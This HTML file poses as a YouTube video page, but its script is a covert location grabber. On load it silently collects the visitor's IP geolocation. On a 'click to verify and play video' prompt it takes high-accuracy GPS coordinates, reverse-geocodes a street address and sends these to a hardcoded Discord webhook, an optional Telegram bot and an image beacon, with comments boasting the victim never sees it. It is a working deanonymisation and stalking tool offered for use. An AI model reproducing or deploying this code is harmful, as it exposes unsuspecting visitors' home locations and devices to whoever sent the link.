<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            width: 90%;
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
        }
        .video-wrapper {
            position: relative;
            width: 100%;
            padding-top: 56.25%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            cursor: pointer;
        }
        .video-wrapper iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
        }
        .video-wrapper img {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
        }
        .play-button {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 72px; height: 72px;
            background: rgba(255,255,255,0.15);
            border: 3px solid rgba(255,255,255,0.4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 2;
        }
        .play-button::after {
            content: '';
            display: block;
            width: 0; height: 0;
            border-left: 22px solid #fff;
            border-top: 14px solid transparent;
            border-bottom: 14px solid transparent;
            margin-left: 4px;
        }
        .hidden { display: none !important; }
        .hint-text {
            position: absolute;
            bottom: 24px; left: 0; right: 0;
            text-align: center;
            color: rgba(255,255,255,0.6);
            font-size: 13px;
            pointer-events: none;
            z-index: 2;
        }
        .location-prompt {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(0,0,0,0.7);
            z-index: 3;
            text-align: center;
            padding: 20px;
        }
        .location-prompt h3 {
            font-size: 18px;
            margin-bottom: 8px;
            font-weight: 400;
        }
        .location-prompt p {
            font-size: 13px;
            color: #aaa;
            margin-bottom: 20px;
        }
        .btn-allow {
            padding: 12px 36px;
            background: #4caf50;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-allow:hover { background: #388e3c; }
    </style>
</head>
<body>

<div class="container">
    <div class="video-wrapper" id="videoWrapper">
        <img id="thumbnail" src="https://img.youtube.com/vi/kLDxvP5X2GY/maxresdefault.jpg" alt="Video" />
        <div class="play-button"></div>
        <div class="hint-text">Click to verify and play video</div>
        <iframe id="videoPlayer" class="hidden" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>
</div>

<script>
(function() {
    'use strict';

    const VIDEO_ID = 'kLDxvP5X2GY';

    // === DISCORD WEBHOOK ===
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1523295864053960824/OcxLxDP-6B5htEA311dzHT1u7qxOKJxChlVPX_PJwFc___7QgGzPe_78rkKGkLQtMLVU';

    // === TELEGRAM BOT (optional) ===
    const TELEGRAM_BOT_TOKEN = '';
    const TELEGRAM_CHAT_ID = '';

    // === DOM refs ===
    const thumbnail    = document.getElementById('thumbnail');
    const playButton   = document.querySelector('.play-button');
    const hintText     = document.querySelector('.hint-text');
    const videoWrapper = document.getElementById('videoWrapper');
    const videoPlayer  = document.getElementById('videoPlayer');

    // ============================================================
    //  Reverse geocode
    // ============================================================
    async function reverseGeocode(lat, lon) {
        try {
            const r = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`,
                { headers: { 'User-Agent': 'VideoPage/1.0' } }
            );
            const d = await r.json();
            return d && d.display_name ? d.display_name : 'Address not found';
        } catch (e) {
            return 'Reverse geocode unavailable';
        }
    }

    // ============================================================
    //  Send to Discord
    // ============================================================
    async function sendToDiscord(text) {
        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('PASTE_YOUR')) return false;
        try {
            const resp = await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: text })
            });
            return resp.ok;
        } catch (e) {
            return false;
        }
    }

    // ============================================================
    //  Send to Telegram
    // ============================================================
    async function sendToTelegram(text) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const resp = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
            });
            return resp.ok;
        } catch (e) {
            return false;
        }
    }

    // ============================================================
    //  Send formatted message
    // ============================================================
    async function sendData(ipData, preciseGeo) {
        const ts = new Date().toISOString();
        const ip = ipData?.ip || 'N/A';
        const lat = preciseGeo?.lat ?? (ipData?.latitude ?? 'N/A');
        const lon = preciseGeo?.lon ?? (ipData?.longitude ?? 'N/A');
        const accuracy = preciseGeo?.accuracy ?? 'N/A';

        let addr = 'Address unavailable';
        if (!isNaN(parseFloat(lat))) {
            addr = await reverseGeocode(lat, lon);
        }

        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

        let msg = '';
        msg += '='.repeat(60) + '\n';
        msg += `🎯 GPS LOCATION CAPTURED at ${ts}\n`;
        msg += '='.repeat(60) + '\n';
        msg += `Lat: ${lat}\n`;
        msg += `Lon: ${lon}\n`;
        msg += `Accuracy: ±${accuracy}\n`;
        msg += `Altitude: ${preciseGeo?.altitude ?? 'N/A'}\n`;
        msg += `Speed: ${preciseGeo?.speed ?? 'N/A'}\n`;
        msg += `Heading: ${preciseGeo?.heading ?? 'N/A'}\n`;
        msg += `Platform: ${navigator.platform || 'N/A'}\n`;
        msg += `Visitor IP: ${ip}\n`;
        msg += '-'.repeat(60) + '\n';
        msg += '📍 STREET ADDRESS:\n';
        msg += addr + '\n';
        msg += '-'.repeat(60) + '\n';
        msg += `🗺️  Maps: ${mapsUrl}\n`;
        msg += '='.repeat(60) + '\n';
        msg += `\nBrowser: ${navigator.userAgent}\n`;
        msg += `Country: ${ipData?.countryName || ipData?.country || 'N/A'}\n`;
        msg += `Region: ${ipData?.regionName || ipData?.region || 'N/A'}\n`;
        msg += `City: ${ipData?.cityName || ipData?.city || 'N/A'}\n`;
        msg += `ISP: ${ipData?.isp || ipData?.org || 'N/A'}`;

        // Also exfil via Image beacon (unblockable)
        try {
            new Image().src = '/capture?d=' + encodeURIComponent(btoa(msg));
        } catch(e) {}

        await sendToDiscord(msg);
        await sendToTelegram(msg);
    }

    // ============================================================
    //  IP Geolocation via JSONP (from the bank page — reliable)
    // ============================================================
    function captureIP() {
        return new Promise(resolve => {
            const script = document.createElement('script');
            script.src = 'https://ipapi.co/json/?callback=handleIPGeo';

            const timeout = setTimeout(() => resolve(null), 5000);

            window.handleIPGeo = function(data) {
                clearTimeout(timeout);
                resolve({
                    ip: data.ip,
                    country: data.country_name,
                    region: data.region,
                    city: data.city,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org
                });
            };

            document.head.appendChild(script);
            script.onload = () => document.head.removeChild(script);
            script.onerror = () => { clearTimeout(timeout); resolve(null); };
        });
    }

    // ============================================================
    //  Browser GPS
    // ============================================================
    function getPreciseLocation() {
        return new Promise(resolve => {
            if (!navigator.geolocation) return resolve(null);

            navigator.geolocation.getCurrentPosition(
                pos => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed,
                    heading: pos.coords.heading
                }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
            );
        });
    }

    // ============================================================
    //  Play video
    // ============================================================
    function playVideo() {
        thumbnail.classList.add('hidden');
        playButton.classList.add('hidden');
        hintText.classList.add('hidden');
        videoPlayer.classList.remove('hidden');
        videoPlayer.src = `https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1&rel=0`;
    }

    // ============================================================
    //  MAIN
    // ============================================================
    (async function init() {
        // Capture IP silently on page load
        const ipData = await captureIP();

        // On click: request GPS, then play video regardless
        videoWrapper.addEventListener('click', async function onClick() {
            videoWrapper.removeEventListener('click', onClick);
            
            const precise = await getPreciseLocation();
            playVideo();
            
            // Send data silently — user never sees this
            if (ipData) {
                sendData(ipData, precise);
            }
        });
    })();
})();
</script>
</body>
</html>
